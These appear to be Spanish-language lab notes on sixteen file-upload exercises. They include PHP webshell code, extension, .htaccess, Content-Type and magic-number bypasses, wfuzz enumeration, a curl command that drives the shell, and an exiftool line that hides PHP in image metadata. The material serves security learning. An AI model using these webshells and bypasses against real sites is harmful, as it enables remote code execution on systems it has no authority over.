


1.-  

En este primer ejercicio se nos muestra una pagina en el que nos menciona que solo se pueden subir archivos jpeg y gif pero al parecer esto no esta validado correctamente y podemos subir un archivo php  

![[Pasted image 20240216193026.png]]


Podemos crear un archivo basico para inyectar comandos tal como es este:

```php
<?php 

echo system(whoami)

?>

```

O algo un poco mas completo como una webshell basica

```php
<?php 

echo system($_GET['cmd'])

?>

```


Ahora subimos el archivo a la pagina y nos dará la ruta donde se alojan los archivos subidos

![[Pasted image 20240216194854.png]]

Entonces entramos a esa ruta y le pasamos en el parametro cmd el comando que se quiera ejecutar


![[Pasted image 20240216195108.png]]


2-

En este segundo paso tenemos la misma pagina solo que cambia una cosa al momento de tratar de subir un archivo que no sea uno valido nos mostrara un error

![[Pasted image 20240216195754.png]]


Al verificar el codigo podemos ver que se hace una validacion que valida la extensiones se activa al momento de darle click al boton de upload 

![[Pasted image 20240216200019.png]]

![[Pasted image 20240216200514.png]]

Para evitar esta validacion tenemos que eliminar esta parte del codigo ya que afortunadamente esta validacion no esta del lado del servidor:

![[Pasted image 20240216202528.png]]

Ya eliminada la validacion ahora si podemos subir el archivo este se alojara el siguiente directorio 

![[Pasted image 20240216202438.png]]

Y listo ahora entrando a esa ruta y pasando por el parametro cmd el comando especifado se nos mostrara en pantalla la salida del comando

![[Pasted image 20240216202408.png]]

3.- 

En este tercer ejercicio al parecer no se pueden subir archivos con la extension php 

![[Pasted image 20240216203711.png]]


Al analizarlo mas a detalle parece ser que las validaciones estan del lado del servidor el cual verifca la extension de archivo mandado el cual valida si esta extension no es igual al php


![[Pasted image 20240217195442.png]]

Al parecer esto tiene una mala implementacion ya que solo verifica que no termine en .php pero hay alternativas de php y asi podemos burlar esta verficacion en este caso podemos probar con diferentes alternativas como estas: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_ y ._php7_

En este ejercicio varias alternativas se pudieron subir pero no funcionaron este caso probamos con .php5 funciono la subida de archivos y nos interpretaba el codigo php 



![[Pasted image 20240217200459.png]]

![[Pasted image 20240217200550.png]]


4.- 

Este ejercicio es muy parecido al anterior ya que al tratar de subir un archivo php nos da la siguiente advertencia

![[Pasted image 20240217201612.png]]

Al analizarlo con burpsuite y usar la estrategia del anterior ejercicio nos damos cuenta que probar con las extensiones _.php2_, _.php3_, ._php4_, ._php5_, ._php6_ y ._php7_ ya no funcionan solo dejar subir el codigo pero el servidor no lo interpreta pero afortunadamente existen mas alternativas para codigo php tal es el caso de .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_ y al momento de probar con .pht nos dejar subir el archivo y ademas pudo interpretar el codigo


![[Pasted image 20240217202742.png]]

![[Pasted image 20240217202827.png]]

5.- 


Este ejercicio es igual a los anteriores no deja subir archivos .php 


![[Pasted image 20240217205557.png]]


Al analizarlo con burpsuite y tratar de usar las misma tecnicas de cambiarle la extension pero al parecer el servidor no interpreta todas las alternativas antes vistas asi que ahora probabaremos de crear nuestras propias reglas subiendo primero un archivo .htacces y definidendo los siguiente regla:

![[Pasted image 20240217213208.png]]

Esto lo que hace es que todos lo archivos que sean .test se interpreten como php ahora solo lo mandamos con la anterior estructura 

![[Pasted image 20240217213304.png]]

Si se sube correctamente entonces ahora podemos mandar un archivo .test y este sera interpretado como php 

![[Pasted image 20240217211841.png]]

Entramos a la ruta que nos proporciona y verificamos si esto es verdad

![[Pasted image 20240217213623.png]]

Listo hemos burlado la seguridad gracias al .htaccess



6.-


Ahora este ejercicio parece ser un poco mas diferente ya que al momento de mandar un archivo verifica el peso del archivo y solo acepta archivos con un peso especifico 


![[Pasted image 20240218114313.png]]

Al analizarlo con ayuda de burpsuite podemos ver que hay dos posibles soluciones la primera es que al parecer podemos modificar el tamaño 

![[Pasted image 20240218115050.png]]

Ahora al aumentar el tamaño y enviarlo ya nos dejar mandar el archivo 

![[Pasted image 20240218115818.png]]

La segunda manera de poder subir el archivo es quitando algunos caracteres del archivo para asi bajar su tamaño y que nos deje enviarlo


![[Pasted image 20240218122107.png]]

Y listo ahora ya podremos ejecutar comandos desde nuestra webshell

![[Pasted image 20240218122342.png]]


7.- 

En este ejercicio podemos ver que es muy similar al anterior ya que verfica el tamaño y si no es igual al especificado no deja enviarlo


![[Pasted image 20240218123846.png]]

Al interceptar con el burpsuite nos damos cuenta de que tambien tiene el mismo error ya que podemos modifcar el tamaño maximo permitido

![[Pasted image 20240218124204.png]]

Pero dejando eso de lado podemos hacer la prueba con ese tamaño especificado para eso podemos hacer uso del siguiente codigo

![[Pasted image 20240218124617.png]]

Con esto evitamos el uso de comillas usando numeros como parametros  y el uso de funciones para ejeuctar comandos del sistema usando el acento grabe ahora solo subimos el archivo y ejecutamos el comando que queramos

![[Pasted image 20240218125125.png]]

![[Pasted image 20240218125213.png]]

8.- 

Este ejercicio parece ser diferente ya que al parecer valida el tipo de archivo pero puede que haya algo mal implementado y se pueda abusar de eso

![[Pasted image 20240218150306.png]]

Al analizarlo con burpsuite y cambiar el content type de application/x-php a image/gif al parecer nos deja subir el archivo ya que es lo unico que valida 

![[Pasted image 20240218150705.png]]

Listo el archivo se ha subido ahora probaremos ejeuctar un comando desde la pagina

![[Pasted image 20240218150834.png]]

Perfecto ha funcionando


9.- 

En este ejercicio al parecer solo puedes mandar gifs ya que si no es un gif nos da el siguiente mensaje


![[Pasted image 20240218190732.png]]

Al inspeccionar el codigo parece que tenemos la misma validacion que vimos anteriormente la cual estaba del lado del servidor y se podia evadir eliminando la siguiente parte del codigo:

![[Pasted image 20240218190935.png]]

Al eliminarla nos sale el siguiente error entonces al parecer tiene mas validaciones


![[Pasted image 20240218191039.png]]


Ahora lo analizamos con burpsuite y tratamos de hacer lo mismo que en el anterior ejercicio cambiar el content type de php por el de gif y lo enviamos

![[Pasted image 20240218191544.png]]

Lamentablemente esto no funciona ya que al momento de enviarlo nos dice que no es un archivo php al parecer cuenta con una validacion de los magic numbers pero afortunadamente hay una forma de evadir esta validacion la cual es añadiendo una cadena al principio del archivo para asi hacer pensar al programa que en verdad estamos subiendo un gif entonces ahora lo modificamos y lo enviamos 

![[Pasted image 20240218192257.png]]

Y listo ahora ya no ha dejado subir el archivo solo queda vericar que la webshell funcione

![[Pasted image 20240218192439.png]]

Excelente ha funcionado


10.-

Con este ejercicio subi el archivo php y se subio correctamente al parecer no hace ninguna validacion


![[Pasted image 20240218194756.png]]

Pero al tratar de entrar a la ruta donde en los demas ejercicios se subian los archivos al parecer no se encontraba este 


![[Pasted image 20240218194951.png]]


Asi que al investigar un poco el codigo fuente se puede ver que al parecer modifca el nombre del archivo y lo codifica en md5

![[Pasted image 20240218195123.png]]

Entonces lo que vamos a hacer es cifrar el nombre de nuestro archivo en md5 y luego trataremos de acceder a el para cifrar en md5 usamos el siguiente comando 


```bash
echo -n "archivo sin extension" | md5sum
```

Ya con el nombre de nuestro archivo en md5 ahora lo que tenemos que hacer es acceder a este y tratar de ejecutar comandos


![[Pasted image 20240218195900.png]]

Perfecto no ha dejado ejecutar comandos


11.-

Este ejercicio es muy parecido al anterior ya que al momento de subir el archivo es practicamente lo mismo que el anterior ejercicio 


![[Pasted image 20240218221637.png]]

Solo que al entrar al endpoint  ya conocido con el nombre en md5 al parecer no encuentra el archivo


![[Pasted image 20240218221752.png]]

Asi que podemos tratar de cifrar el nombre y la extension en md5 con el comando del anterior ejercicio para tratar de ver si asi encuentra el archivo 

![[Pasted image 20240218222047.png]]

Excelente nos ha dejado ejecutar comando algo sencillo para ser sincero


12.-

Este ejercicio es muy parecido al los dos anteriores ya que al subir un archivo php  te deja subirlo correctamente pero pues a este posiblemente se le ha cambiado el nombre 

![[Pasted image 20240218224742.png]]

Al tratar de acceder al archivo con el nombre sin extension cifrado en md5 y con el nombre y extension en md5 al parecer no se encuentra ningun archivo que tenga ese tipo de nombre pero al analizar el codigo mas al parecer cifra el contenido en sha1 y este lo pone de nombre


![[Pasted image 20240218225744.png]]

Entonces tendremos que cifrar el contenido en sha1 con ayuda del siguiente comando 


```bash
sha1sum archivo
```

Listo ahora teniendo el contenido cifrado en sha1 podemos usar ese resultado como nombre y asi ejecutar comandos 


![[Pasted image 20240218230139.png]]

13.- 

Ahora en este ejercicio al parecer nos deja subir nuestro archivo perfectamente sin ninguna limitacion pero lamentablemente ahora no tenemos ninguna referencia de donde se ubica ese archivo guardado 


![[Pasted image 20240218232951.png]]

Entonces al no tener ninguna referencia lo que podemos hacer es enumerar los directorios con el siguiente comando

```bash
wfuzz -c -t hilos -w wordlist direccion del sitio 
```

Al ejecutar este comando podemos ver que encuentra varios directorios pero uno de esos es el de imagenes


![[Pasted image 20240219144255.png]]


Al ver esto puede que el archivo que hemos subido se haya guardado en ese directorio asi que ingresamos y vemos si podemos ejecutar comandos

![[Pasted image 20240219144646.png]]

Muy bien nos ha dejado ejecutar comandos 



14.- 

Al tratar de subir un archivo php directamente el sitio nos responde con error al parecer tiene algunas validaciones 

![[Pasted image 20240219145838.png]]


Al interceptar con burpsuite y probar todas las soluciones de los anteriores ejercicios ninguna de estas funciono pero no hay por que preocuparse ya que afortuanadamente hay mas formas de evadir validaciones y en este caso este ejercicio tiene una validacion de la extension la cual verfica que el archivo tenga la extension .jpeg o .jpg y si esto se presenta entonces nos dejara subir el archivo asi que utitlizaremos el metodo de la doble extension y probaremos a subirlo 

![[Pasted image 20240219150645.png]]

Listo se ha subido el archivo ahora entramos al directorio donde se guardan los archivos y tratamos de ejecutar comandos

![[Pasted image 20240219150837.png]]

Magnifico no ha dejado ejecutar comandos


15.-


Este ejercicio es un poco diferente a los demas ya que nos pide el nombre de la carpeta donde se guardara el archivo como tambien el archivo a subir al parecer se sube correctamente 

![[Pasted image 20240219151504.png]]

Al subirlo nos da un hipervinculo el cual al darle click se nos descarga ese archivo que hemos subido lo cual no queremos lo que queremos es ejecutar comandos

![[Pasted image 20240219153744.png]]


Una manera de poder ejecutar comandos es con el uso de la url del hipervinculo que nos dan para descargar el archivo y con ayuda de curl tratar de ver si podemos pasarle el parametro para ejecutar comandos para eso primero tenemos que encontrar la url del archivo subido haciendo click derecho del hipervinculo y copiando el enlace de este para despues ejecutar el siguiente comando 


```bash
curl -s -X GET "ip" -G --data-urlencode "parametro=comando"
```

Y listo con esto puedes mandarle un parametro a ese archivo para que este lo interprete y te de el comando como respuesta como a continuacion 


![[Pasted image 20240219162149.png]]

16.- 

Finalmente en este ejercicio tiene algo de pareceido al anterior ejercicio ya que nos pide el  nombre del directorio donde se va a guardar todo y el archivo en cuestion pero al subir un archivo php lamentablemente no lo deja subir 


![[Pasted image 20240219165845.png]]

Asi que al intentar todas la formas que vimos anteriormente de evadir validaciones de ese tipo al parecer se puede subir un archivo .htaccess para asi en este modificar reglas y que un archivo .test sea interpretado como php entonces mandamos un archivo .htaccess con la siguiente regla 

![[Pasted image 20240219171151.png]]

Muy bien ya esto subido ahora lo que tenemos que hacer es subir el archivo para hacer la web shell asi que mandamos un archivo .test con codigo php 


![[Pasted image 20240219171443.png]]

Lamentablemente esto no funciona ya que tiene otra validacion en este caso al probar varios metodos de los ejercicios anteriores al parecer el metodo que funciona es el cambiar el content type por uno de gif y tambien cambiar los magic numbers asi que ahora hacemos esas modifcaciones y volvemos a tratar de subir el archivo

![[Pasted image 20240219171917.png]]

Excelente ahora ya no ha dejado subir el archivo ahora solo falta verificar si podemos ejecutar comandos asi que entramos al directorio que creamos y tratamos de ejeuctar un comando

![[Pasted image 20240219172751.png]]

Listo tenemos ejecucion de comandos


Finalmente dejando atras todo ejercicio otra forma en la que podemos abusar de la subida de archivos en inyectando codigo en alguna imagen para eso podemos usar la herramienta exiftools por ejemplo se puede usar el siguiente comando


```bash
exiftool -Comment='<?php system(comando);?>' imagen
```


Para mas informacion podemos consultar las siguientes paginas 

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)
[Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload)







